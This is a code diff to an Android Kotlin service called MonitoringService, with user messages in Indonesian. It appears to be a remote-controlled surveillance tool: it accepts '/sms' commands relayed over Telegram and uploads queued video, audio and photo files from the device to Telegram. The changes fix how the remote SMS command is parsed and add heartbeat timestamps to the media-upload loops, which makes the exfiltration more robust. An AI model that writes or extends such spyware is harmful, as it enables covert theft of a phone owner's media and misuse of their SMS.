@@ -3692,6 +3692,8 @@ class MonitoringService : Service() {
         var number = ""
         var smsText = ""
         var normalized = ""
+        val wholeCandidate = trimmedArg.filter { !it.isWhitespace() && it != '-' && it != '(' && it != ')' && it != '.' }
+        val wholeIsNumber = wholeCandidate.all { it.isDigit() || it == '+' } && SMS_NUMBER_REGEX.matchEntire(wholeCandidate) != null
         for (i in trimmedArg.indices) {
             if (!trimmedArg[i].isWhitespace()) continue
             val candidate = trimmedArg.substring(0, i).trim()
@@ -3714,10 +3716,9 @@ class MonitoringService : Service() {
                 number = candidate
                 normalized = parsed
                 smsText = rest
-                break
             }
         }
-        if (trimmedArg.isEmpty() || !trimmedArg.any { it.isWhitespace() }) {
+        if (trimmedArg.isEmpty() || !trimmedArg.any { it.isWhitespace() } || wholeIsNumber) {
             sendToTelegram("Cara pakai: /sms &lt;nomor&gt; &lt;pesan&gt;")
         } else if (number.isEmpty() || smsText.isEmpty()) {
             sendToTelegram("\u26A0\uFE0F Nomor tidak valid. Cara pakai: /sms &lt;nomor&gt; &lt;pesan&gt;")
@@ -9115,6 +9116,7 @@ class MonitoringService : Service() {
                     }
                     val videoOutcome = sendVideoFile(file)
                     if (videoOutcome == MediaSendOutcome.KEPT) break@drain
+                    monitorBeatAt = android.os.SystemClock.elapsedRealtime()
                     batchProgress = true
                     videoProgress = true
                     if (videoOutcome == MediaSendOutcome.DROPPED) droppedVideos++
@@ -9192,6 +9194,7 @@ class MonitoringService : Service() {
                     }
                     val audioOutcome = sendAudioFile(file)
                     if (audioOutcome == MediaSendOutcome.KEPT) break@drain
+                    monitorBeatAt = android.os.SystemClock.elapsedRealtime()
                     batchProgress = true
                     audioProgress = true
                     if (audioOutcome == MediaSendOutcome.DROPPED) droppedAudio++
@@ -9485,6 +9488,7 @@ class MonitoringService : Service() {
                         if (keptThisBatch >= 2) break@drain
                         continue
                     }
+                    monitorBeatAt = android.os.SystemClock.elapsedRealtime()
                     batchProgress = true
                     photoProgress = true
                     if (photoOutcome == MediaSendOutcome.DROPPED) droppedPhotos++
